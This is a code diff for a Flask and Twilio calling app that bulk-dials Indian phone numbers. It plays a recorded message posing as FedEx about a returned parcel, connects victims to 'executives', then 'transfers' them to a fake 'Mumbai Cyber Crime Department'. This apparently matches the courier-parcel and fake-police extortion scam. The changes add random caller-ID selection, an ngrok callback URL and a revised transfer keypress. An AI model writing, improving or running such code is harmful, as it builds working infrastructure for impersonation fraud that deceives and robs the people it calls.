@@ -1,4 +1,4 @@
-from flask import Flask, request, Response, render_template
+from flask import Flask, request, Response, render_template , jsonify
 from twilio.rest import Client
 from twilio.twiml.voice_response import VoiceResponse, Gather, Dial
 import firebase_admin
@@ -6,6 +6,7 @@ from firebase_admin import credentials, db
 import time
 import os
 from dotenv import load_dotenv
+import random
 
 
 load_dotenv()
@@ -34,6 +35,8 @@ if not firebase_admin._apps:
 
 app = Flask(__name__)
 
+RUN_URL = 'https://major-publicly-ape.ngrok-free.app/'
+
 # Twilio Credentials
 account_sid = os.getenv('TWILIO_SDK_SID')
 auth_token = os.getenv('TWILIO_SDK_TOKEN')
@@ -49,34 +52,46 @@ crimeexecutives_ref = db.reference('/crimeexecutives/')
 initial_message = 'This is calling from Fedex international courier service. Your parcel has been returned. Please press 1 for more information.'
 hold_message = 'Please wait while we are transferring the call to FedEx international courier service.'
 transfer_message = 'This call has been transferred to the Mumbai Cyber Crime Department.'
+from_phone_numbers = [
+    '+19045724924'
+]
+
+@app.route('/')
+def index():
+    return render_template('index.html')
 
 @app.route('/make-call', methods=['POST'])
 def make_call():
     """Initiates call to all customer numbers."""
-    customer_numbers = request.json.get('numbers', [])
+    customer_numbers = request.json.get('phoneNumbers', [])
     if not customer_numbers:
         return {'message': 'No customers to call'}, 200
 
     interval = 200
     for phone in customer_numbers:
+        to = str(phone)
+        if not to.startswith('+'):
+            to = '+91' + to
+
         free_executive = find_free_executive()
         if not free_executive:
             time.sleep(0.5)
             interval += 500
             continue
 
+        from_number = random.choice(from_phone_numbers)
         try:
             call = client.calls.create(
-                url='https://a95b-27-7-5-16.ngrok-free.app/voice-response',
-                to=phone,
-                from_='+19045724924',
-                status_callback='https://a95b-27-7-5-16.ngrok-free.app/call-status',
+                url= RUN_URL + '/voice-response',
+                to=to,
+                from_= from_number,
+                status_callback= RUN_URL + '/call-status',
                 status_callback_event=['completed', 'failed', 'busy', 'no-answer']
             )
 
             calllogs_ref.child(call.sid).set({
                 'receiver': phone,
-                'from': '+19045724924',
+                'from': from_number,
                 'executive': free_executive,
                 'status': 'ongoing',
             })
@@ -134,6 +149,7 @@ def gather_response():
         response.say(hold_message)
         free_executive = find_free_executive()
         if free_executive:
+            # Dial the executive and wait for their input
             dial = Dial(action='/cont')
             dial.number(free_executive)
             response.append(dial)
@@ -151,10 +167,12 @@ def gather_response():
 
 @app.route('/cont', methods=['POST'])
 def cont():
-    """Prompts to transfer the call to Cyber Crime Department."""
+    """Prompts to transfer the call to Cyber Crime Department if '00' is pressed."""
     response = VoiceResponse()
-    response.say("Press 7 to transfer this call to the Mumbai Cyber Crime Department.", voice='alice')
-    gather = Gather(num_digits=1, action='/transfer-response', method='POST', timeout=10)
+    response.say("Press 00 to transfer this call to the Mumbai Cyber Crime Department.", voice='alice')
+    
+    # Gather input from the customer care executive
+    gather = Gather(num_digits=2, action='/transfer-response', method='POST', timeout=10)
     response.append(gather)
     
     return Response(str(response), mimetype='text/xml')
@@ -165,7 +183,7 @@ def transfer_response():
     digits = request.form.get('Digits')
     response = VoiceResponse()
 
-    if digits == '7':
+    if digits == '00':
         response.say(transfer_message)
         free_crime_exec = find_free_crime_executive()
         if free_crime_exec:
